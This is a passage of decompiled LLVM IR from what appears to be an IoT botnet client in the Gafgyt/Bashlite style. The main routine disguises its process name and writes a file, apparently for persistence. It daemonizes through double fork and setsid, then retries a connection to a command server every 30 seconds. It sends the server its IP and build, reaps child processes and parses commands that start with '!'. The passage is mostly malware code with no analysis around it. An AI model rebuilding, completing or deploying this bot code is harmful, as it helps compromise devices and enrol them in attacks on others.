  uselistorder label %dec_label_pc_100069ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006964, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_100121c8.517 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-4192 = alloca i32, align 4
  %stack_var_-5816 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-5732 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-5472 = alloca i32, align 4
  %stack_var_-5728 = alloca i32, align 4
  %v1_10006aec = bitcast i8** %argv to i32*
  %v2_10006aec = load i32, i32* %v1_10006aec, align 4
  store i32 %v2_10006aec, i32* @r3, align 4
  %v0_10006b00 = call i32 @__GI_strlen()
  store i32 ptrtoint (i32* @global_var_100121d0.518 to i32), i32* @r4, align 4
  store i32 268462876, i32* @lr, align 4
  %v3_10006b18 = call i32 @strncpy(i32 %v2_10006aec, i32 ptrtoint (i32* @global_var_100121d0.518 to i32), i32 %v0_10006b00)
  store i32 ptrtoint (i32* @global_var_100121d0.518 to i32), i32* %v1_10006aec, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006b4c.519 to i32), i32* @lr, align 4
  %v7_10006b48 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_100121d0.518 to i32), i32 0, i32 0, i32 0, i32 %tmp)
  store i32 268462932, i32* @lr, align 4
  %v1_10006b50 = call i32 @__GI_time(i32 0)
  store i32 268462940, i32* @lr, align 4
  %v0_10006b58 = call i32 @__libc_getpid()
  %v2_10006b60 = xor i32 %v1_10006b50, %v0_10006b58
  store i32 ptrtoint ([3 x i8]* @global_var_10006b6c.520 to i32), i32* @lr, align 4
  %v1_10006b68 = call i32 @srand(i32 %v2_10006b60)
  store i32 268462964, i32* @lr, align 4
  %v1_10006b70 = call i32 @__GI_time(i32 0)
  store i32 268462972, i32* @lr, align 4
  %v0_10006b78 = call i32 @__libc_getpid()
  %v2_10006b80 = xor i32 %v1_10006b70, %v0_10006b78
  %v1_10006b88 = call i32 @init_rand(i32 %v2_10006b80)
  store i32 268463024, i32* @lr, align 4
  %v3_10006bac = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_100121d4.522 to i32), i32 ptrtoint ([2 x i8]* @global_var_100121e8.523 to i32))
  %v3_10006bbc = icmp eq i32 %v3_10006bac, 0
  br i1 %v3_10006bbc, label %dec_label_pc_10006bc4, label %dec_label_pc_10006be8

dec_label_pc_10006bc4:                            ; preds = %entry
  store i32 268463072, i32* @lr, align 4
  %v3_10006bdc = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_100121ec.524 to i32), i32 ptrtoint ([2 x i8]* @global_var_100121e8.523 to i32))
  br label %dec_label_pc_10006be8

dec_label_pc_10006be8:                            ; preds = %entry, %dec_label_pc_10006bc4
  %stack_var_-5756.0 = phi i32 [ %v3_10006bdc, %dec_label_pc_10006bc4 ], [ %v3_10006bac, %entry ]
  %stack_var_-5752.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100121ec.524, i32 0, i32 0), %dec_label_pc_10006bc4 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_100121d4.522, i32 0, i32 0), %entry ]
  %v3_10006bec = icmp eq i32 %stack_var_-5756.0, 0
  br i1 %v3_10006bec, label %dec_label_pc_10006d68, label %dec_label_pc_10006bf4

dec_label_pc_10006bf4:                            ; preds = %dec_label_pc_10006be8
  %v2_10006bf8 = load i32, i32* %v1_10006aec, align 4
  store i32 %v2_10006bf8, i32* @r3, align 4
  %v0_10006c00 = call i32 @__GI_strlen()
  %v2_10006c14 = ptrtoint i32* %stack_var_-5728 to i32
  store i32 268463140, i32* @lr, align 4
  %v2_10006c20 = call i32 @getcwd(i32 %v2_10006c14, i32 256)
  store i32 ptrtoint (i32* @global_var_100121fc.525 to i32), i32* @r4, align 4
  %v2_10006c34 = bitcast i32* %stack_var_-5728 to i8*
  %v3_10006c34 = call i32 @__GI_strcoll(i8* %v2_10006c34, i32 ptrtoint (i32* @global_var_100121fc.525 to i32))
  %v3_10006c3c = icmp eq i32 %v3_10006c34, 0
  br i1 %v3_10006c3c, label %dec_label_pc_10006d60, label %dec_label_pc_10006c54.preheader

dec_label_pc_10006c54.preheader:                  ; preds = %dec_label_pc_10006bf4
  %v2_10006c58115 = load i32, i32* %v1_10006aec, align 4
  %v2_10006c60116 = add i32 %v2_10006c58115, %v0_10006c00
  %v1_10006c64117 = inttoptr i32 %v2_10006c60116 to i8*
  %v2_10006c64118 = load i8, i8* %v1_10006c64117, align 1
  %v3_10006c6c122 = icmp eq i8 %v2_10006c64118, 47
  br i1 %v3_10006c6c122, label %dec_label_pc_10006c74, label %dec_label_pc_10006c48

dec_label_pc_10006c48:                            ; preds = %dec_label_pc_10006c54.preheader, %dec_label_pc_10006c48
  %stack_var_-5760.0123 = phi i32 [ %v1_10006c4c, %dec_label_pc_10006c48 ], [ %v0_10006c00, %dec_label_pc_10006c54.preheader ]
  %v1_10006c4c = add i32 %stack_var_-5760.0123, -1
  %v2_10006c58 = load i32, i32* %v1_10006aec, align 4
  %v2_10006c60 = add i32 %v2_10006c58, %v1_10006c4c
  %v1_10006c64 = inttoptr i32 %v2_10006c60 to i8*
  %v2_10006c64 = load i8, i8* %v1_10006c64, align 1
  %v3_10006c6c = icmp eq i8 %v2_10006c64, 47
  br i1 %v3_10006c6c, label %dec_label_pc_10006c74, label %dec_label_pc_10006c48

dec_label_pc_10006c74:                            ; preds = %dec_label_pc_10006c48, %dec_label_pc_10006c54.preheader
  %stack_var_-5760.0.lcssa = phi i32 [ %v0_10006c00, %dec_label_pc_10006c54.preheader ], [ %v1_10006c4c, %dec_label_pc_10006c48 ]
  %v2_10006c78 = load i32, i32* %v1_10006aec, align 4
  %v2_10006c80 = add i32 %v2_10006c78, %stack_var_-5760.0.lcssa
  %v2_10006c84 = ptrtoint i32* %stack_var_-5472 to i32
  store i32 %v2_10006c84, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10006ca8.527 to i32), i32* @lr, align 4
  %v7_10006ca4 = load i32, i32* @r8, align 4
  %v11_10006ca4 = call i32 @sprintf(i32 %v2_10006c84, i32 ptrtoint ([8 x i8]* @global_var_10012200.526 to i32), i32 %v2_10006c14, i32 %v2_10006c80, i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 %v7_10006ca4, i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_10006cac = ptrtoint i32* %stack_var_-5216 to i32
  br label %dec_label_pc_10006cec.outer

dec_label_pc_10006cac:                            ; preds = %dec_label_pc_10006cec
  store i32 268463296, i32* @lr, align 4
  %v3_10006cbc = call i32 @fgets(i32 %v2_10006cac, i32 1024, i32 %stack_var_-5756.0)
  store i32 %v2_10006cac, i32* @r3, align 4
  store i32 %v2_10006c84, i32* @r4, align 4
  %v2_10006cd0 = call i32 @__GI_strcasecmp(i32 %v2_10006cac, i32 %v2_10006c84)
  %v3_10006cd8 = icmp eq i32 %v2_10006cd0, 0
  br i1 %v3_10006cd8, label %dec_label_pc_10006ce0, label %dec_label_pc_10006cec

dec_label_pc_10006ce0:                            ; preds = %dec_label_pc_10006cac
  %v1_10006ce4 = add i32 %stack_var_-5764.0.ph, 1
  br label %dec_label_pc_10006cec.outer

dec_label_pc_10006cec.outer:                      ; preds = %dec_label_pc_10006ce0, %dec_label_pc_10006c74
  %stack_var_-5764.0.ph = phi i32 [ %v1_10006ce4, %dec_label_pc_10006ce0 ], [ 0, %dec_label_pc_10006c74 ]
  br label %dec_label_pc_10006cec

dec_label_pc_10006cec:                            ; preds = %dec_label_pc_10006cec.outer, %dec_label_pc_10006cac
  store i32 268463348, i32* @lr, align 4
  %v1_10006cf0 = call i32 @feof(i32 %stack_var_-5756.0)
  %v3_10006cf8 = icmp eq i32 %v1_10006cf0, 0
  br i1 %v3_10006cf8, label %dec_label_pc_10006cac, label %dec_label_pc_10006d00

dec_label_pc_10006d00:                            ; preds = %dec_label_pc_10006cec
  %v3_10006d04 = icmp eq i32 %stack_var_-5764.0.ph, 0
  br i1 %v3_10006d04, label %dec_label_pc_10006d0c, label %dec_label_pc_10006d54

dec_label_pc_10006d0c:                            ; preds = %dec_label_pc_10006d00
  store i32 268463380, i32* @lr, align 4
  %v1_10006d10 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10006d10 = call i32 @__GI_fclose(i16* %v1_10006d10)
  %v4_10006d14 = ptrtoint i8* %stack_var_-5752.0 to i32
  store i32 268463396, i32* @lr, align 4
  %v3_10006d20 = call i32 @__GI_fopen(i32 %v4_10006d14, i32 ptrtoint (i32* @global_var_10012208.528 to i32))
  %v3_10006d30 = icmp eq i32 %v3_10006d20, 0
  br i1 %v3_10006d30, label %dec_label_pc_10006d68, label %dec_label_pc_10006d38

dec_label_pc_10006d38:                            ; preds = %dec_label_pc_10006d0c
  store i32 268463432, i32* @lr, align 4
  %v2_10006d44 = call i32 @__GI_fputs(i32 %v2_10006c84, i32 %v3_10006d20)
  store i32 ptrtoint (i32* @global_var_10006d50.529 to i32), i32* @lr, align 4
  %v1_10006d4c = inttoptr i32 %v3_10006d20 to i16*
  %v2_10006d4c = call i32 @__GI_fclose(i16* %v1_10006d4c)
  br label %dec_label_pc_10006d68

dec_label_pc_10006d54:                            ; preds = %dec_label_pc_10006d00
  store i32 ptrtoint (i32* @global_var_10006d5c.530 to i32), i32* @lr, align 4
  %v1_10006d58 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10006d58 = call i32 @__GI_fclose(i16* %v1_10006d58)
  br label %dec_label_pc_10006d68

dec_label_pc_10006d60:                            ; preds = %dec_label_pc_10006bf4
  store i32 268463464, i32* @lr, align 4
  %v1_10006d64 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10006d64 = call i32 @__GI_fclose(i16* %v1_10006d64)
  br label %dec_label_pc_10006d68

dec_label_pc_10006d68:                            ; preds = %dec_label_pc_10006d0c, %dec_label_pc_10006be8, %dec_label_pc_10006d54, %dec_label_pc_10006d38, %dec_label_pc_10006d60
  store i32 ptrtoint (i32* @global_var_10006d6c.531 to i32), i32* @lr, align 4
  %v0_10006d68 = call i32 @getOurIP()
  store i32 268463472, i32* @lr, align 4
  %v0_10006d6c = call i32 @__libc_fork()
  %v3_10006d7c = icmp eq i32 %v0_10006d6c, 0
  br i1 %v3_10006d7c, label %dec_label_pc_10006dac, label %dec_label_pc_10006df0

dec_label_pc_10006dac:                            ; preds = %dec_label_pc_10006d68
  store i32 268463536, i32* @lr, align 4
  %v0_10006dac = call i32 @__libc_fork()
  %v3_10006dbc = icmp eq i32 %v0_10006dac, 0
  br i1 %v3_10006dbc, label %dec_label_pc_10006dcc.thread, label %dec_label_pc_10006dd8

dec_label_pc_10006dcc.thread:                     ; preds = %dec_label_pc_10006dac
  br label %dec_label_pc_10006e04

dec_label_pc_10006dd8:                            ; preds = %dec_label_pc_10006dac
  %v0_10006dc8 = call i32 @__GI_exit()
  %v4_10006de8 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1001220c.533 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006e04

dec_label_pc_10006df0:                            ; preds = %dec_label_pc_10006d68
  %v2_10006d84 = ptrtoint i32* %stack_var_-5732 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_10006d98.532 to i32), i32* @lr, align 4
  %v3_10006d94 = call i32 @__libc_waitpid(i32 %v0_10006d6c, i32 %v2_10006d84, i32 0)
  %v0_10006d9c = call i32 @__GI_exit()
  %v4_10006e00 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1001220c.533 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006e04

dec_label_pc_10006e04:                            ; preds = %dec_label_pc_10006dcc.thread, %dec_label_pc_10006dd8, %dec_label_pc_10006df0
  store i32 268463624, i32* @lr, align 4
  %v0_10006e04 = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_10006e14.536 to i32), i32* @lr, align 4
  %v3_10006e10 = call i32 @chdir(i32 ptrtoint (i32* @global_var_100121fc.525 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  store i32 ptrtoint (i32* @global_var_10006e20.537 to i32), i32* @lr, align 4
  %v2_10006e1c = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_100076a8 = ptrtoint i32* %stack_var_-4192 to i32
  %v4_100076b8 = bitcast i32* %stack_var_-4192 to i8*
  %v2_10007170 = ptrtoint i32* %stack_var_-5816 to i32
  %v2_10007440 = ptrtoint i32* %stack_var_-5216 to i32
  %v1_100072ac = or i32 %v2_100076a8, 1
  %v2_10007670 = add i32 %v2_10007170, 344
  br label %dec_label_pc_10006e24.outer

dec_label_pc_10006e24.outer:                      ; preds = %dec_label_pc_100071f4, %dec_label_pc_100076a0, %dec_label_pc_10006e04
  %stack_var_-5748.0.ph21 = phi i32 [ 0, %dec_label_pc_10006e04 ], [ %stack_var_-5748.2.ph, %dec_label_pc_100076a0 ], [ %v1_100071f8, %dec_label_pc_100071f4 ]
  %v0_10006e2425 = call i32 @initConnection()
  %v3_10006e2c28 = icmp eq i32 %v0_10006e2425, 0
  br i1 %v3_10006e2c28, label %dec_label_pc_10006e40, label %dec_label_pc_10006e34

dec_label_pc_10006e34:                            ; preds = %dec_label_pc_10006e24.outer, %dec_label_pc_10006e34
  store i32 268463676, i32* @lr, align 4
  %v1_10006e38 = call i32 @sleep(i32 30)
  %v0_10006e24 = call i32 @initConnection()
  %v3_10006e2c = icmp eq i32 %v0_10006e24, 0
  br i1 %v3_10006e2c, label %dec_label_pc_10006e40, label %dec_label_pc_10006e34

dec_label_pc_10006e40:                            ; preds = %dec_label_pc_10006e34, %dec_label_pc_10006e24.outer
  %v3_10006e4c = load i32, i32* @global_var_10024a48.54, align 4
  store i32 %v3_10006e4c, i32* %stack_var_-80, align 4
  store i32 268463712, i32* @lr, align 4
  %v3_10006e5c = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268566528)
  %v0_10006e64 = call i32 @getBuild()
  %v0_10006e6c = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10006e88.539 to i32), i32* @lr, align 4
  %v5_10006e84 = call i32 @Rootsprintf(i32 %v0_10006e6c, i32 ptrtoint (i32* @global_var_1001221c.538 to i32), i32 %v3_10006e5c)
  br label %dec_label_pc_100076a0.outer

dec_label_pc_10006ea8:                            ; preds = %dec_label_pc_1000715c, %dec_label_pc_10007100
  %v1_10006eac = mul i32 %storemerge12, 4
  %v3_10006eb8 = load i32, i32* @global_var_10024a54.46, align 4
  %v2_10006ebc = add i32 %v3_10006eb8, %v1_10006eac
  %v1_10006ec0 = inttoptr i32 %v2_10006ebc to i32*
  %v2_10006ec0 = load i32, i32* %v1_10006ec0, align 4
  store i32 268463828, i32* @lr, align 4
  %v3_10006ed0 = call i32 @__libc_waitpid(i32 %v2_10006ec0, i32 0, i32 1)
  %tmp110 = icmp slt i32 %v3_10006ed0, 1
  br i1 %tmp110, label %dec_label_pc_100070f4, label %dec_label_pc_10006f38

dec_label_pc_10006ef0:                            ; preds = %dec_label_pc_10006f38, %dec_label_pc_10006f80
  %v1_10006ef4 = mul i32 %v1_10006ee4, 4
  %v3_10006f00 = load i32, i32* @global_var_10024a54.46, align 4
  %v2_10006f04 = add i32 %v3_10006f00, %v1_10006ef4
  %v1_10006f08 = add i32 %v2_10006f04, -4
  %v1_10006f24 = inttoptr i32 %v2_10006f04 to i32*
  %v2_10006f24 = load i32, i32* %v1_10006f24, align 4
  %v2_10006f28 = inttoptr i32 %v1_10006f08 to i32*
  store i32 %v2_10006f24, i32* %v2_10006f28, align 4
  br label %dec_label_pc_10006f38

dec_label_pc_10006f38:                            ; preds = %dec_label_pc_10006ea8, %dec_label_pc_10006ef0
  %storemerge18 = phi i32 [ %v1_10006ee4, %dec_label_pc_10006ef0 ], [ %storemerge12, %dec_label_pc_10006ea8 ]
  %v1_10006ee4 = add i32 %storemerge18, 1
  %v2_10006f60 = load i32, i32* @global_var_10024a28.44, align 4
  %v3_10006f78 = icmp eq i32 %v2_10006f60, 0
  br i1 %v3_10006f78, label %dec_label_pc_10006f80, label %dec_label_pc_10006ef0

dec_label_pc_10006f80:                            ; preds = %dec_label_pc_10006f38
  %v3_10006f64 = load i32, i32* @global_var_10024a2c.45, align 4
  %v3_10006f98 = icmp ugt i32 %v3_10006f64, %v1_10006ee4
  br i1 %v3_10006f98, label %dec_label_pc_10006ef0, label %dec_label_pc_10006fa0

dec_label_pc_10006fa0:                            ; preds = %dec_label_pc_10006f80
  %v1_10006fa4 = mul i32 %v1_10006ee4, 4
  %v3_10006fb0 = load i32, i32* @global_var_10024a54.46, align 4
  %v2_10006fb4 = add i32 %v1_10006fa4, -4
  %v1_10006fb8 = add i32 %v2_10006fb4, %v3_10006fb0
  %v2_10006fc0 = inttoptr i32 %v1_10006fb8 to i32*
  store i32 0, i32* %v2_10006fc0, align 4
  %v3_10006fcc = load i32, i32* @global_var_10024a2c.45, align 4
  %v2_10006fd0 = load i32, i32* @global_var_10024a28.44, align 4
  %v1_10006fd4 = add i32 %v3_10006fcc, -1
  %v2_10006fd4 = icmp ne i32 %v3_10006fcc, 0
  %v2_10006fd8 = zext i1 %v2_10006fd4 to i32
  %v3_10006fd8 = add i32 %v2_10006fd0, -1
  %v4_10006fd8 = add i32 %v3_10006fd8, %v2_10006fd8
  store i32 %v4_10006fd8, i32* @global_var_10024a28.44, align 4
  store i32 %v1_10006fd4, i32* @global_var_10024a2c.45, align 4
  %v1_10007008 = mul i32 %v1_10006fd4, 4
  %v1_10007010 = add i32 %v1_10007008, 4
  store i32 %v1_10007010, i32* @r3, align 4
  store i32 268464156, i32* @lr, align 4
  %v0_10007018 = call i32 @malloc()
  br label %dec_label_pc_10007070

dec_label_pc_10007030:                            ; preds = %dec_label_pc_10007070, %dec_label_pc_100070b8
  %v1_10007034 = mul i32 %storemerge17, 4
  %v2_10007040 = add i32 %v1_10007034, %v0_10007018
  %v3_10007054 = load i32, i32* @global_var_10024a54.46, align 4
  %v2_10007058 = add i32 %v3_10007054, %v1_10007034
  %v1_1000705c = inttoptr i32 %v2_10007058 to i32*
  %v2_1000705c = load i32, i32* %v1_1000705c, align 4
  %v2_10007060 = inttoptr i32 %v2_10007040 to i32*
  store i32 %v2_1000705c, i32* %v2_10007060, align 4
  %v1_10007068 = add i32 %storemerge17, 1
  br label %dec_label_pc_10007070

dec_label_pc_10007070:                            ; preds = %dec_label_pc_10006fa0, %dec_label_pc_10007030
  %storemerge17 = phi i32 [ 0, %dec_label_pc_10006fa0 ], [ %v1_10007068, %dec_label_pc_10007030 ]
  %v2_10007098 = load i32, i32* @global_var_10024a28.44, align 4
  %v3_100070b0 = icmp eq i32 %v2_10007098, 0
  br i1 %v3_100070b0, label %dec_label_pc_100070b8, label %dec_label_pc_10007030

dec_label_pc_100070b8:                            ; preds = %dec_label_pc_10007070
  %v3_1000709c = load i32, i32* @global_var_10024a2c.45, align 4
  %v3_100070d0 = icmp ugt i32 %v3_1000709c, %storemerge17
  br i1 %v3_100070d0, label %dec_label_pc_10007030, label %dec_label_pc_100070d8

dec_label_pc_100070d8:                            ; preds = %dec_label_pc_100070b8
  %v3_100070dc = load i32, i32* @global_var_10024a54.46, align 4
  store i32 %v3_100070dc, i32* @r3, align 4
  store i32 268464360, i32* @lr, align 4
  %v0_100070e4 = call i32 @free()
  store i32 %v0_10007018, i32* @global_var_10024a54.46, align 4
  br label %dec_label_pc_100070f4

dec_label_pc_100070f4:                            ; preds = %dec_label_pc_10006ea8, %dec_label_pc_100070d8
  %v1_100070f8 = add i32 %storemerge12, 1
  br label %dec_label_pc_10007100

dec_label_pc_10007100:                            ; preds = %dec_label_pc_100076a0, %dec_label_pc_100070f4
  %storemerge12 = phi i32 [ %v1_100070f8, %dec_label_pc_100070f4 ], [ 0, %dec_label_pc_100076a0 ]
  %tmp125 = icmp slt i32 %storemerge12, 0
  %v1_10007104 = zext i1 %tmp125 to i32
  %v2_10007104 = ashr i32 %storemerge12, 31
  %v3_10007104 = and i32 %v2_10007104, -2
  %v4_10007104 = or i32 %v3_10007104, %v1_10007104
  %v2_1000712c = load i32, i32* @global_var_10024a28.44, align 4
  %v3_10007130 = load i32, i32* @global_var_10024a2c.45, align 4
  %v3_10007144 = icmp ugt i32 %v2_1000712c, %v4_10007104
  br i1 %v3_10007144, label %dec_label_pc_10006ea8, label %dec_label_pc_1000714c

dec_label_pc_1000714c:                            ; preds = %dec_label_pc_10007100
  %v4_10007144 = icmp eq i32 %v2_1000712c, %v4_10007104
  br i1 %v4_10007144, label %dec_label_pc_1000715c, label %dec_label_pc_1000716c

dec_label_pc_1000715c:                            ; preds = %dec_label_pc_1000714c
  %v3_10007164 = icmp ugt i32 %v3_10007130, %storemerge12
  br i1 %v3_10007164, label %dec_label_pc_10006ea8, label %dec_label_pc_1000716c

dec_label_pc_1000716c:                            ; preds = %dec_label_pc_1000714c, %dec_label_pc_1000715c
  %v2_10007174 = add i32 %v5_100076b8, %v2_10007170
  %v3_1000717c = add i32 %v2_10007174, 1624
  %v4_1000717c = inttoptr i32 %v3_1000717c to i8*
  store i8 0, i8* %v4_1000717c, align 1
  %v1_10007188 = call i32 @trim(i32 %v2_100076a8)
  store i32 268464544, i32* @lr, align 4
  %v6_1000719c = call i32 @strstr(i32 %v2_100076a8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10011c58.28, i32 0, i32 0), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v4_100071a8 = icmp eq i32 %v6_1000719c, %v2_100076a8
  br i1 %v4_100071a8, label %dec_label_pc_100071b0, label %dec_label_pc_100071d0

dec_label_pc_100071b0:                            ; preds = %dec_label_pc_1000716c
  %v3_100071b4 = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_100071cc.541 to i32), i32* @lr, align 4
  %v5_100071c8 = call i32 @Rootsprintf(i32 %v3_100071b4, i32 ptrtoint ([5 x i8]* @global_var_10012284.540 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_100076a0

dec_label_pc_100071d0:                            ; preds = %dec_label_pc_1000716c
  store i32 268464612, i32* @lr, align 4
  %v6_100071e0 = call i32 @strstr(i32 %v2_100076a8, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001228c.542, i32 0, i32 0), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v4_100071ec = icmp eq i32 %v6_100071e0, %v2_100076a8
  br i1 %v4_100071ec, label %dec_label_pc_100071f4, label %dec_label_pc_10007228

dec_label_pc_100071f4:                            ; preds = %dec_label_pc_100071d0
  %v1_100071f8 = add i32 %stack_var_-5748.2.ph, 1
  %v4_10007210 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_10012298.543 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %tmp111 = icmp slt i32 %v1_100071f8, 21
  br i1 %tmp111, label %dec_label_pc_10006e24.outer, label %dec_label_pc_10007220

dec_label_pc_10007220:                            ; preds = %dec_label_pc_100071f4
  %v0_10007224 = call i32 @__GI_exit()
  br label %dec_label_pc_10007228

dec_label_pc_10007228:                            ; preds = %dec_label_pc_100071d0, %dec_label_pc_10007220
  %stack_var_-5748.1 = phi i32 [ %v1_100071f8, %dec_label_pc_10007220 ], [ %stack_var_-5748.2.ph, %dec_label_pc_100071d0 ]
  %v2_10007234 = load i8, i8* %v4_100076b8, align 4
  %v3_1000723c = icmp eq i8 %v2_10007234, 33
  br i1 %v3_1000723c, label %dec_label_pc_10007260, label %dec_label_pc_100076a0.outer

dec_label_pc_10007260:                            ; preds = %dec_label_pc_10007228, %dec_label_pc_10007274
  %storemerge = phi i32 [ %v1_10007248, %dec_label_pc_10007274 ], [ %v2_100076a8, %dec_label_pc_10007228 ]
  %v1_10007248 = add i32 %storemerge, 1
  %storemerge8 = inttoptr i32 %v1_10007248 to i8*
  %v2_10007264 = load i8, i8* %storemerge8, align 1
  %v3_1000726c = icmp eq i8 %v2_10007264, 32
  br i1 %v3_1000726c, label %dec_label_pc_10007288, label %dec_label_pc_10007274

dec_label_pc_10007274:                            ; preds = %dec_label_pc_10007260
  %v2_10007278 = load i8, i8* %storemerge8, align 1
  %v3_10007280 = icmp eq i8 %v2_10007278, 0
  br i1 %v3_10007280, label %dec_label_pc_10007288, label %dec_label_pc_10007260

dec_label_pc_10007288:                            ; preds = %dec_label_pc_10007274, %dec_label_pc_10007260
  %v2_1000728c = load i8, i8* %storemerge8, align 1
  %v3_10007294 = icmp eq i8 %v2_1000728c, 0
  br i1 %v3_10007294, label %dec_label_pc_100076a0.outer, label %dec_label_pc_1000729c

dec_label_pc_1000729c:                            ; preds = %dec_label_pc_10007288
  store i8 0, i8* %storemerge8, align 1
  store i32 %v1_100072ac, i32* @r3, align 4
  %v0_100072bc = call i32 @__GI_strlen()
  %v2_100072cc = add i32 %v0_100072bc, %v2_100076a8
  %v1_100072d0 = add i32 %v2_100072cc, 2
  %v2_1000731c = add i32 %v2_100072cc, 1
  br label %dec_label_pc_10007304

dec_label_pc_100072dc:                            ; preds = %dec_label_pc_10007334, %dec_label_pc_10007304
  store i32 %v1_100072d0, i32* @r3, align 4
  %v0_100072e4 = call i32 @__GI_strlen()
  %v1_100072f8 = add i32 %v0_100072e4, %v2_1000731c
  %v3_10007300 = inttoptr i32 %v1_100072f8 to i8*
  store i8 0, i8* %v3_10007300, align 1
  br label %dec_label_pc_10007304

dec_label_pc_10007304:                            ; preds = %dec_label_pc_1000729c, %dec_label_pc_100072dc
  store i32 %v1_100072d0, i32* @r3, align 4
  %v0_1000730c = call i32 @__GI_strlen()
  %v1_10007320 = add i32 %v0_1000730c, %v2_1000731c
  %v1_10007324 = inttoptr i32 %v1_10007320 to i8*
  %v2_10007324 = load i8, i8* %v1_10007324, align 1
  %v3_1000732c = icmp eq i8 %v2_10007324, 10
  br i1 %v3_1000732c, label %dec_label_pc_100072dc, label %dec_label_pc_10007334

dec_label_pc_10007334:                            ; preds = %dec_label_pc_10007304
  store i32 %v1_100072d0, i32* @r3, align 4
  %v0_1000733c = call i32 @__GI_strlen()
  %v1_10007350 = add i32 %v0_1000733c, %v2_1000731c
  %v1_10007354 = inttoptr i32 %v1_10007350 to i8*
  %v2_10007354 = load i8, i8* %v1_10007354, align 1
  %v3_1000735c = icmp eq i8 %v2_10007354, 13
  br i1 %v3_1000735c, label %dec_label_pc_100072dc, label %dec_label_pc_1000737c.preheader

dec_label_pc_1000737c.preheader:                  ; preds = %dec_label_pc_10007334
  %stack_var_-5780.029 = inttoptr i32 %v1_100072d0 to i8*
  %v2_1000738030 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000738834 = icmp eq i8 %v2_1000738030, 32
  br i1 %v3_1000738834, label %dec_label_pc_100073a4, label %dec_label_pc_10007390

dec_label_pc_10007370:                            ; preds = %dec_label_pc_10007390
  %v1_10007374 = add i32 %storemerge1935, 1
  %stack_var_-5780.0 = inttoptr i32 %v1_10007374 to i8*
  %v2_10007380 = load i8, i8* %stack_var_-5780.0, align 1
  %v3_10007388 = icmp eq i8 %v2_10007380, 32
  br i1 %v3_10007388, label %dec_label_pc_100073a4, label %dec_label_pc_10007390

dec_label_pc_10007390:                            ; preds = %dec_label_pc_1000737c.preheader, %dec_label_pc_10007370
  %stack_var_-5780.036 = phi i8* [ %stack_var_-5780.0, %dec_label_pc_10007370 ], [ %stack_var_-5780.029, %dec_label_pc_1000737c.preheader ]
  %storemerge1935 = phi i32 [ %v1_10007374, %dec_label_pc_10007370 ], [ %v1_100072d0, %dec_label_pc_1000737c.preheader ]
  %v2_10007394 = load i8, i8* %stack_var_-5780.036, align 1
  %v3_1000739c = icmp eq i8 %v2_10007394, 0
  br i1 %v3_1000739c, label %dec_label_pc_100073a4, label %dec_label_pc_10007370

dec_label_pc_100073a4:                            ; preds = %dec_label_pc_10007370, %dec_label_pc_10007390, %dec_label_pc_1000737c.preheader
  %storemerge19.lcssa = phi i32 [ %v1_100072d0, %dec_label_pc_1000737c.preheader ], [ %v1_10007374, %dec_label_pc_10007370 ], [ %storemerge1935, %dec_label_pc_10007390 ]
  %stack_var_-5780.0.lcssa = phi i8* [ %stack_var_-5780.029, %dec_label_pc_1000737c.preheader ], [ %stack_var_-5780.0, %dec_label_pc_10007370 ], [ %stack_var_-5780.036, %dec_label_pc_10007390 ]
  store i8 0, i8* %stack_var_-5780.0.lcssa, align 1
  %v1_100073b4 = add i32 %storemerge19.lcssa, 1
  %v2_1000740041 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000740844 = icmp eq i8 %v2_1000740041, 0
  br i1 %v3_1000740844, label %dec_label_pc_10007410, label %dec_label_pc_100073c8

dec_label_pc_100073c8:                            ; preds = %dec_label_pc_100073a4, %dec_label_pc_100073c8
  %storemerge746 = phi i8* [ %storemerge7, %dec_label_pc_100073c8 ], [ %stack_var_-5780.029, %dec_label_pc_100073a4 ]
  %storemerge1445 = phi i32 [ %v1_100073f4, %dec_label_pc_100073c8 ], [ %v1_100072d0, %dec_label_pc_100073a4 ]
  %v3_100073cc = load i8, i8* %storemerge746, align 1
  %v4_100073cc = zext i8 %v3_100073cc to i32
  store i32 268465120, i32* @lr, align 4
